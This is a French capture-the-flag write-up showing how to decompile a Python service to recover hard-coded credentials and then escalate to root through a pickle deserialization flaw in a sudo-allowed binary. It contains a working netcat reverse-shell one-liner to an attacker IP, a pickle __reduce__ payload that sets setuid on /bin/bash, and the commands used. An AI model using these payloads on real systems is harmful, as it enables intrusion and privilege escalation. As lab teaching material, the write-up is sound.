---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-502 et CWE-269
---

# Jormungandr — Root Flag
# Writeup — Mjollnir / Ragnarok (Exegol)

## Résumé

Challenge en deux temps : un service réseau Python (`mjollnir.pyc`) exposant un login codé en dur mais obfusqué, permettant l'accès à un shell restreint sur la machine `midgard` sous l'utilisateur `jormungandr` ; puis une élévation de privilèges via un binaire `sudo` (`ragnarok`) vulnérable à une désérialisation Python non sécurisée (`pickle.loads`), menant à un shell root.

---

## Étape 1 — Analyse de `mjollnir.pyc`

Le service écoutait sur un port et demandait un couple username/password.

### Décompilation

Le fichier étant un `.pyc` compilé pour une version de Python récente, `decompyle3` a suffi :

```
pip install decompyle3 --break-system-packages
decompyle3 mjollnir.pyc
```

### Extraction des identifiants

Le code révélait :

```python
username = long_to_bytes(128672430374905338731062386)
password = long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582)
```

Les identifiants étaient stockés comme de grands entiers (obfuscation basique), convertis en bytes via `long_to_bytes` de `Crypto.Util.number`. Il suffit de refaire la même conversion :

```python
def long_to_bytes(n):
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')

print(long_to_bytes(128672430374905338731062386))
print(long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582))
```

**Résultat :**
- Username : `jormungandr`
- Password : `Jag_ar_Jormungandr_midgardsormen`

### Connexion

Connexion au service (`nc <host> <port>`) avec ces identifiants → accès à un pseudo-shell exécutant les commandes via `subprocess.Popen`.

### Obtention d'un shell interactif (reverse shell)

Le pseudo-shell du service (`subprocess.Popen` sans PTY) est très limité : pas d'interactivité réelle, pas de gestion de `sudo` en confort, etc. Pour obtenir un shell pleinement interactif, on utilise un reverse shell via named pipe.

Sur la machine attaquante, on met un listener en écoute :

```
nc -lvnp 4444
```

Depuis le pseudo-shell obtenu sur la cible, on envoie la commande suivante :

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.1.52 4444 >/tmp/f
```

**Explication :**
- `rm /tmp/f` : supprime un éventuel fichier existant du même nom
- `mkfifo /tmp/f` : crée un named pipe (FIFO) servant de canal de communication
- `cat /tmp/f | sh -i 2>&1 | nc 10.8.1.52 4444 > /tmp/f` : chaîne les flux pour que `sh -i` lise ses commandes depuis le FIFO et renvoie stdout/stderr vers la connexion `nc`, tout en rebouclant l'entrée vers le FIFO — ce qui donne un shell interactif complet côté attaquant.

Une fois la connexion établie sur le listener, on dispose d'un vrai shell interactif sur la machine cible (`midgard`), facilitant grandement la suite de l'énumération et l'exploitation de la faille `sudo`.

---

## Étape 2 — Élévation de privilèges

### Reconnaissance

```
sudo -l
```

```
User jormungandr may run the following commands on midgard:
    (root) NOPASSWD: /opt/ragnarok/ragnarok
```

Le binaire `/opt/ragnarok/ragnarok` est exécutable en root sans mot de passe. Le dossier `/opt/ragnarok/` (root:root, non writable) contenait un exécutable **PyInstaller** figé (Python 3.5), accompagné de ses bibliothèques (`libpython3.5m.so`, `base_library.zip`, etc.), écartant la piste "remplacement du binaire".

### Extraction du bytecode embarqué

```
pip install pyinstxtractor-ng --break-system-packages
pyinstxtractor-ng /opt/ragnarok/ragnarok
```

→ dossier `ragnarok_extracted/` contenant le point d'entrée `ragnarok.pyc`.

### Décompilation (Python 3.5)

`decompyle3` ne supporte pas Python 3.5 ; `uncompyle6` a fonctionné :

```
pip install uncompyle6 --break-system-packages
uncompyle6 ragnarok_extracted/ragnarok.pyc
```

### Code source récupéré

```python
from sys import exit
import pickle, base64, binascii

print("This is the end of time! Choose your last meal before battle!\n")
entered = input("meal: ")
try:
    data = base64.b64decode(entered)
except (binascii.Error, EOFError):
    print("Error: the meal is 64 times worst than I thought")
    exit()

try:
    meal = pickle.loads(data)
except (pickle.UnpicklingError, KeyError, EOFError):
    print("Error: If this is your last meal, include at least a pickle in it!")
    exit()

print("Your meal is:", meal)
```

### Vulnérabilité

`pickle.loads()` sur une entrée utilisateur (même base64-décodée) permet l'exécution de code arbitraire via la méthode magique `__reduce__`. Le binaire tournant en root via `sudo`, l'exploitation donne un shell root.

### Exploitation

Génération du payload pickle malveillant :

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('chmod +s /bin/bash',))

payload = base64.b64encode(pickle.dumps(Exploit(), protocol=2))
print(payload.decode())
```

Exécution :

```
sudo /opt/ragnarok/ragnarok
meal: <payload base64>
```

Le payload déclenche `os.system('chmod +s /bin/bash')` en root, posant le bit setuid sur `/bin/bash`.

### Élévation finale

```
/bin/bash -p
id
```

```
uid=1001(jormungandr) gid=1001(jormungandr) euid=0(root) egid=0(root) groups=0(root),1001(jormungandr)
```

Shell root confirmé.

---

## Récupération du flag

Le fichier `root.txt` dans `/root/` avait un nom contenant des caractères Unicode invisibles avant/après (visibles via `ls -la | cat -A` : séquences `M-bM-^@M-^@`). Contournement via wildcard ou complétion automatique bash :

```
cat /root/*root.txt*
```

---

## Résumé des techniques utilisées

| Étape | Technique |
|---|---|
| Récupération credentials | Décompilation `.pyc`, désobfuscation d'entiers (`long_to_bytes`) |
| Reconnaissance privesc | `sudo -l` |
| Extraction binaire PyInstaller | `pyinstxtractor-ng` |
| Décompilation bytecode legacy (Py 3.5) | `uncompyle6` |
| Exploitation | Pickle deserialization RCE (`__reduce__`) |
| Persistance/élévation | `chmod +s /bin/bash` + `bash -p` |
| Contournement nommage exotique | Wildcard shell / complétion bash |

## Outils utilisés

- `decompyle3`, `uncompyle6` — décompilation bytecode Python
- `pyinstxtractor-ng` — extraction d'exécutables PyInstaller
- Python (`pickle`, `base64`, `os`) — génération du payload RCE

## Remédiation

- Ne jamais désérialiser des données `pickle` provenant d'une source non fiable ; utiliser un format de données sans exécution de code.
- Ne pas donner à un utilisateur une règle `sudo` lui permettant de modifier l'environnement d'un programme privilégié.
- Retirer les permissions SUID inutiles, notamment sur les interpréteurs ou shells, et contrôler les droits avec le principe du moindre privilège.
- Ne pas laisser de secrets dans le bytecode ou dans les exécutables distribués ; révoquer tout identifiant exposé.

## Reproductibilité

Les outils, commandes, permissions observées et résultats de `id` sont indiqués dans le parcours. Un tiers peut refaire la chaîne sur une cible identique en installant les versions de décompilateurs mentionnées et en adaptant l'adresse IP.